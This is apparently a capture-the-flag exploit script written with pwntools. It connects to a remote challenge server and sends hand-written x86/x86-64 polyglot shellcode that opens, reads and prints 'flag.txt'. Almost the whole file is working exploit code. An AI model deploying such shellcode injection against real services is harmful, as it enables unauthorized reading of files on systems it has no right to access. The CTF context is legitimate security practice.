from pwn import *

#io = process("./pwnme32")
#io = process("./pwnme64")
#gdb.attach(io,"b*0x80481ee")
#gdb.attach(io,"b*0x40020d")
io = remote("parallel.tghack.no",6005)
shellcode  = asm("""
                  xor eax,eax
                  push eax
                  push eax
                  mov eax,0x40000005
                  push 0x67616c66
                  xor ecx,ecx
                  mov ecx,0x7478742e
                  xor dword ptr [esp+4],ecx
                  push esp
                  mov eax,0xffffffff
                  inc eax
                  pop ebx
                  cmp al,0
                  je x86
                  push esp
                  xor eax,eax
                  mov eax,0x2
                  pop edi
                  xor esi,esi
                  xor edx,edx
                  syscall
                  mov edi,eax
                  xor eax,eax
                  xor esi,esi
                  mov esi,0x600008
                  xor edx,edx
                  mov edx,50
                  syscall
                  mov edx,eax
                  xor eax,eax
                  mov eax,0x1
                  xor ecx,ecx
                  mov edi,0x1
                  syscall

            x86:
                xor eax,eax
                mov eax,0x5
                xor ecx,ecx
                xor edx,edx
                int 0x80
                xor ebx,ebx
                mov ebx,eax
                xor eax,eax
                mov eax,0x3
                xor ecx,ecx
                mov ecx,0x8049034
                xor edx,edx
                mov edx,50
                int 0x80
                mov edx,eax
                mov eax,0x4
                xor ebx,ebx
                mov ebx,0x1
                int 0x80
""")

io.recvuntil("Please give me some shellcode :))")
io.sendline(shellcode)

io.interactive()
